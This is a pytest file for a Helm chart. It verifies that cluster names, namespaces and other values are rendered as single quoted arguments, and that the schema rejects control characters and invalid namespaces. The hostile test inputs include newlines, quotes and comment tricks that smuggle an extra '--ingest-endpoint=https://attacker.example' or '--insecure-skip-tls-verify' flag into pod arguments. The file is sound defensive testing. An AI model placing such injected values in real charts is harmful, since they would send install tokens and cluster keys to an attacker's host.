# SPDX-License-Identifier: Apache-2.0

"""A value that the command or the customer puts into the chart is one argument of every kit pod, never more.

The exchange hook, the reporter and the uninstall Job run `reporter` with the ingest endpoint on their command line, and
the exchange sends the install token to it. Go's flag package keeps the last of two `--ingest-endpoint`s, so a value
that could split an argument in two (a newline in `cluster.name`, which the schema used to limit only in length) would
send the token or the cluster's own key, and with it the right to speak for this cluster, to another host. A name such
as `eu: prod` or `prod #1` is an ordinary name that must reach the pod whole.

Two things hold it, and each is proved on its own:

* every argument is rendered as one quoted string, whatever the value holds: what the schema refuses is rendered with
  the schema switched off, so that nothing but the quoting is under test;
* the schema refuses what no cluster name or namespace is: control characters in a name, more than 128 characters, and
  a namespace that is not a DNS label.
"""

from __future__ import annotations

import copy
import functools
import json
import tempfile
from pathlib import Path

import pytest
import yaml
from test_chart import CHART, CI_VALUES, find, helm
from test_chart_exchange import TOKEN

ENDPOINT = "--ingest-endpoint=https://ingest.example.test"
ATTACKER = "- --ingest-endpoint=https://attacker.example"

# The three pods that take the cluster's values on their command line.
CONSUMERS = {
    "the exchange Job": ("Job", "impact-ai-exchange"),
    "the reporter": ("Deployment", "impact-ai-reporter"),
    "the uninstall Job": ("Job", "impact-ai-uninstall"),
}

HOSTILE_NAMES = {
    "a new list item": "prod\n            - --ingest-endpoint=https://attacker.example",
    "a new list item at another depth": "prod\n  - --insecure-skip-tls-verify",
    "a comment": "prod #--ingest-endpoint=https://attacker.example",
    "a quote": 'prod" --ingest-endpoint=https://attacker.example',
    "an apostrophe": "prod' --api-server=https://attacker.example",
    "a mapping": "key: value",
    "a leading dash": "-x --ingest-endpoint=https://attacker.example",
    "control characters": "prod\x1b[31m" + chr(0x202E),  # an escape sequence and a right-to-left override
    # Names a person types: a colon and a space turn an argument into a map, a space and a hash start a comment.
    "a label and a colon": "eu: prod",
    "a number sign": "prod #1",
    # A newline and a list item at the left margin, as a values file carries them.
    "a list item at the margin": f"\n{ATTACKER}",
    "a list item after a name": f"prod\n{ATTACKER}",
}

# Names with a control character, which the schema refuses: a cluster name is printable text.
CONTROL = {name: value for name, value in HOSTILE_NAMES.items() if any(ord(c) < 0x20 or ord(c) == 0x7F for c in value)}
PRINTABLE = {name: value for name, value in HOSTILE_NAMES.items() if name not in CONTROL}

# Namespaces that are not DNS labels. The first eight can split an argument and are rendered; the schema refuses all.
HOSTILE_NAMESPACES = {
    "a new list item": "shop\n            - --ingest-endpoint=https://attacker.example",
    "a list item at the margin": f"shop\n{ATTACKER}",
    "a comma": "shop,--ingest-endpoint=https://attacker.example",
    "a space": "shop support",
    "a quote": 'shop" --ingest-endpoint=https://attacker.example',
    "a comment": "shop #1",
    "a mapping": "team: shop",
    "a leading dash": "-shop",
    "upper case": "Shop",
    "a slash": "shop/support",
    "a trailing dash": "shop-",
    "an underscore": "shop_support",
    "sixty-four characters": "a" * 64,
    "empty": "",
}
RENDERED = list(HOSTILE_NAMESPACES)[:8]


def merged(base: dict, extra: dict) -> dict:
    out = copy.deepcopy(base)
    for key, value in extra.items():
        out[key] = merged(out[key], value) if isinstance(value, dict) and isinstance(out.get(key), dict) else value
    return out


def template(values: dict, *, schema: bool = True, check: bool = True):
    """helm template of the CI values and a token install, with these values in a file: no character of a value is
    then an escape of --set."""
    with tempfile.TemporaryDirectory() as directory:
        path = Path(directory) / "values.yaml"
        path.write_text(
            json.dumps(merged({"ingest": {"key": ""}, "install": {"token": TOKEN}}, values))
        )  # JSON is YAML
        command = ["template", "impact-ai", str(CHART), "-n", "impact-ai", "-f", str(CI_VALUES), "-f", str(path)]
        return helm(*command, *([] if schema else ["--skip-schema-validation"]), check=check)


@functools.cache
def _render(values: str, schema: bool) -> tuple:
    return tuple(d for d in yaml.safe_load_all(template(json.loads(values), schema=schema).stdout) if d)


def render(values: dict, *, schema: bool = True, operator: bool = False) -> list:
    """The documents of a token install. Helm makes a certificate for each webhook of an install with the Operator and
    the cover pod, which is most of a render. The arguments of the pods do not depend on them, so they are left out
    unless asked for. Each distinct render is made once."""
    values = values if operator else merged(values, {"operator": {"install": False}})
    return list(_render(json.dumps(values, sort_keys=True), schema))


def args_of(documents: list, consumer: str) -> list:
    kind, name = CONSUMERS[consumer]
    return find(documents, kind, name)["spec"]["template"]["spec"]["containers"][0]["args"]


def flag_of(argument: str) -> str:
    return argument.split("=", 1)[0]


def assert_whole(documents: list, benign: list, expected: dict[str, list[str]]) -> None:
    """In every pod: the arguments are the benign render's, in the same order and each a string, so none was added, lost
    or split; the value of each flag in `expected` is whole in its own; and the only endpoint is the chart's."""
    for consumer, flags in expected.items():
        args, reference = args_of(documents, consumer), args_of(benign, consumer)
        assert all(isinstance(a, str) for a in args), (consumer, args)
        assert [flag_of(a) for a in args] == [flag_of(a) for a in reference], (
            f"{consumer}: an argument was added or split"
        )
        for argument in flags:
            assert args.count(argument) == 1, f"{consumer}: {argument!r} is not one argument of {args}"
        endpoints = [a for a in args if a.startswith("--ingest-endpoint")]
        assert len(endpoints) == 1, f"{consumer}: {endpoints}"
        if not any(f.startswith("--ingest-endpoint") for f in flags):
            assert endpoints == [ENDPOINT], f"{consumer}: the endpoint is the chart's own"


# --- a cluster name ---------------------------------------------------------------------------------------------------


def test_the_arguments_keep_their_values_when_nothing_is_hostile():
    documents = render({"cluster": {"name": "prod-eks"}})
    for consumer in CONSUMERS:
        args = args_of(documents, consumer)
        assert ENDPOINT in args and "--cluster-name=prod-eks" in args
    assert args_of(documents, "the exchange Job")[0] == "exchange"
    assert "--release-name=impact-ai" in args_of(documents, "the reporter")
    assert "--release-namespace=impact-ai" in args_of(documents, "the uninstall Job")


@pytest.mark.parametrize("name", PRINTABLE.values(), ids=PRINTABLE.keys())
def test_a_name_a_person_can_type_is_accepted_and_is_one_argument_of_every_kit_pod(name):
    documents = render({"cluster": {"name": name}})  # the schema accepts it
    expected = {consumer: [f"--cluster-name={name}"] for consumer in CONSUMERS}
    assert_whole(documents, render({"cluster": {"name": "prod-eks"}}), expected)


@pytest.mark.parametrize("name", CONTROL.values(), ids=CONTROL.keys())
def test_a_name_with_a_control_character_is_one_argument_of_every_kit_pod_even_without_the_schema(name):
    documents = render({"cluster": {"name": name}}, schema=False)
    expected = {consumer: [f"--cluster-name={name}"] for consumer in CONSUMERS}
    assert_whole(documents, render({"cluster": {"name": "prod-eks"}}), expected)


@pytest.mark.parametrize("name", CONTROL.values(), ids=CONTROL.keys())
def test_a_name_with_a_control_character_is_refused_by_the_schema(name):
    result = template({"cluster": {"name": name}}, check=False)
    assert result.returncode != 0
    assert "/cluster/name" in result.stderr, result.stderr


@pytest.mark.parametrize(
    ("name", "accepted"),
    [
        ("a" * 128, True),
        ("é" * 128, True),  # characters, not bytes: the intake counts runes
        ("a" * 129, False),
        ("é" * 129, False),
        ("a\tb", False),
        ("a\x7fb", False),
        ("Produktion Wien: Rechenzentrum #1 (Ä)", True),
    ],
)
def test_a_cluster_name_is_printable_text_of_at_most_128_characters(name, accepted):
    result = template({"cluster": {"name": name}}, check=False)
    assert (result.returncode == 0) is accepted, result.stderr
    if not accepted:
        assert "/cluster/name" in result.stderr, result.stderr


# --- namespaces -------------------------------------------------------------------------------------------------------


@pytest.mark.parametrize("item", RENDERED)
def test_a_namespace_is_one_argument_of_the_reporter_whatever_it_holds(item):
    value = HOSTILE_NAMESPACES[item]
    lists = {"include": [value, "support"], "exclude": [value, "support"]}
    documents = render({"namespaces": lists}, schema=False)
    benign = render({"namespaces": {"include": ["shop", "support"], "exclude": ["shop", "support"]}})
    expected = {"the reporter": [f"--include-namespaces={value},support", f"--exclude-namespaces={value},support"]}
    assert_whole(documents, benign, expected)


def test_a_namespace_reaches_the_cover_webhook_as_data_and_never_as_structure():
    values = [HOSTILE_NAMESPACES[item] for item in RENDERED]
    documents = render({"namespaces": {"include": values, "exclude": values}}, schema=False, operator=True)
    webhook = find(documents, "MutatingWebhookConfiguration", "impact-ai-cover")["webhooks"][0]
    expressions = webhook["namespaceSelector"]["matchExpressions"]
    by_operator = {e["operator"]: e["values"] for e in expressions if "values" in e}
    assert by_operator["In"] == values and set(values) <= set(by_operator["NotIn"])
    assert len(expressions) == 3, "a value added no selector of its own"


@pytest.mark.parametrize("item", HOSTILE_NAMESPACES.values(), ids=HOSTILE_NAMESPACES.keys())
def test_a_namespace_that_is_not_a_dns_label_is_refused_by_the_schema(item):
    result = template({"namespaces": {"include": ["shop", item], "exclude": ["shop", item]}}, check=False)
    assert result.returncode != 0
    assert "/namespaces/include/1" in result.stderr and "/namespaces/exclude/1" in result.stderr, result.stderr


def test_the_namespaces_a_cluster_has_are_accepted():
    names = ["shop", "support-2", "0abc", "a", "a" * 63, "kube-system"]
    args = args_of(render({"namespaces": {"include": names, "exclude": names}}), "the reporter")
    assert f"--include-namespaces={','.join(names)}" in args and f"--exclude-namespaces={','.join(names)}" in args


# --- the other values that reach a command line -----------------------------------------------------------------------

BENIGN = {
    "ingest": {"endpoint": "https://ingest.example.test"},
    "reporter": {"interval": "5m"},
    "cloud": {"accountId": "123456789012", "region": "eu-west-1"},
    "cluster": {"arn": "arn:aws:eks:eu-west-1:123456789012:cluster/prod"},
}
# value, the flag it becomes, and the pods that take the flag
OTHER = [
    (("ingest", "endpoint"), "--ingest-endpoint", ["the exchange Job", "the reporter", "the uninstall Job"]),
    (("reporter", "interval"), "--interval", ["the reporter"]),
    (("cloud", "accountId"), "--cloud-account-id", ["the reporter", "the uninstall Job"]),
    (("cloud", "region"), "--cloud-region", ["the reporter", "the uninstall Job"]),
    (("cluster", "arn"), "--cluster-arn", ["the exchange Job", "the reporter", "the uninstall Job"]),
]
TRAILERS = {
    "a list item": "\n            " + ATTACKER,
    "a list item at the margin": "\n" + ATTACKER,
    "a comment": " #" + ATTACKER,
    "a quote": '" ' + ATTACKER,
}


@pytest.mark.parametrize("trailer", TRAILERS.values(), ids=TRAILERS.keys())
def test_no_other_value_can_split_an_argument_either(trailer):
    hostile = copy.deepcopy(BENIGN)
    for group, name in (path for path, _, _ in OTHER):
        hostile[group][name] += trailer
    documents = render(hostile, schema=False)
    expected: dict[str, list[str]] = {consumer: [] for consumer in CONSUMERS}
    for (group, name), flag, consumers in OTHER:
        for consumer in consumers:
            expected[consumer].append(f"{flag}={hostile[group][name]}")
    assert_whole(documents, render(BENIGN), expected)


# --- the templates quote what they render -----------------------------------------------------------------------------


def test_every_argument_the_templates_take_from_a_value_is_rendered_quoted():
    """The rule, where the templates are written: an argument that takes a value from the chart is `printf ... | quote`.

    A list item under `args:` that holds a template expression and no `| quote` is how `--cluster-name={{ . }}` split.
    """
    problems = []
    for template_file in sorted((CHART / "templates").glob("*.yaml")):
        in_args, indent = False, 0
        for number, line in enumerate(template_file.read_text().splitlines(), 1):
            stripped = line.strip()
            width = len(line) - len(line.lstrip())
            if stripped == "args:":
                in_args, indent = True, width
                continue
            if in_args and stripped and not stripped.startswith(("#", "{{")) and width <= indent:
                in_args = False
            if in_args and stripped.startswith("- ") and "{{" in stripped and "| quote" not in stripped:
                problems.append(f"{template_file.name}:{number}: {stripped}")
    assert problems == []
